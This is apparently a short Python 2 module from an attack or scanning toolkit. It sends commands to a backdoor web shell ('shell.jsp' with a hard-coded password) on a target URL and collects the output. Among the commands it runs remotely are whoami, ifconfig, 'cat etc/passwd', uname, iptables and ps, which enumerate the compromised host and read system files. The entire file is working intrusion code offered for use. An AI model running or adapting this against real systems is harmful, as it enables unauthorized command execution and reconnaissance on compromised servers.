#-*-coding:utf-8-*-
import requests
import txconfig
from lxml import etree
import sys

def main(param):
    headers = txconfig.Request_Param.HEADERS
    result = {
        "success":False,
        "flag":{},
        "result": {}
    }
    try:
        url = param
    except Exception as e:
        result['result'] = e
        return result
    list1 = []
    headers = txconfig.Request_Param.HEADERS
    cmd = ["whoami", "ls", "dir ", "ipconfig", "ifconfig", "pwd", "cat etc/passwd", "uname -a", "head -n 1 /etc/issue",
           "iptables -L", "route -n", "ps -ef", "chkconfig --lis"]
    for i in cmd:
        url = param
        url = url + "/shell.jsp?&pwd=023&cmd=" + i
        Re = requests.get(url, headers=headers)
        html = etree.HTML(Re.text)
        resu = html.xpath('/html/body/pre/text()')
        list1.append(resu)

    result['flag'] = list1
    result['success'] = True
    return result

if __name__ == '__main__':
    param = sys.argv[1]
    print main(param)
